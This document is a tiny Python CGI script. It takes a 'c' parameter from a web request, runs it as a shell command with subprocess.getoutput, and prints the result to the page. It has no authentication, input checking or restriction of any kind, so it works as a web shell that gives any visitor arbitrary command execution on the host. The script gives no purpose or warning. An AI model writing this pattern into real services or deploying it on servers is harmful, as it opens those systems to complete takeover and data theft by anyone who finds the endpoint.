#!/usr/bin/python3
print("content-type: text/html")
#print("location: http://www.google.com")
print()

import cgi
import subprocess

form=cgi.FieldStorage()
cmd=form.getvalue("c")

output=subprocess.getoutput(cmd)
print(output)


